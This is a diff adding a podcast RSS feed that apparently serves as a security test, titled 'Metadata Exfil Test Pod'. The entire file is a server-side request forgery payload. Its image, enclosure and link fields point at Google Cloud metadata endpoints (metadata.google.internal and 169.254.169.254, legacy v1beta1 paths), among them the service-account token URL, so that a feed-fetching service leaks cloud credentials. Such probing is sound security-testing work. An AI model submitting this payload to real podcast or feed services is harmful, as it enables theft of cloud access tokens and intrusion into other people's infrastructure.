@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
+  <channel>
+    <title>Metadata Exfil Test Pod</title>
+    <link>https://example.com</link>
+    <description>Testing metadata exfil via secondary RSS URLs</description>
+    <language>en</language>
+    <itunes:image href="http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"/>
+    <image>
+      <url>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</url>
+      <title>Test</title>
+      <link>https://example.com</link>
+    </image>
+    <itunes:author>testpod@example.com</itunes:author>
+    <managingEditor>testpod@example.com (Test)</managingEditor>
+    <item>
+      <title>Episode 1</title>
+      <description>Test</description>
+      <enclosure url="http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token" type="audio/mpeg" length="1234"/>
+      <link>http://metadata.google.internal/computeMetadata/v1beta1/instance/hostname</link>
+      <guid isPermaLink="false">metadata-test-001</guid>
+      <itunes:image href="http://169.254.169.254/computeMetadata/v1beta1/project/project-id"/>
+    </item>
+  </channel>
+</rss>
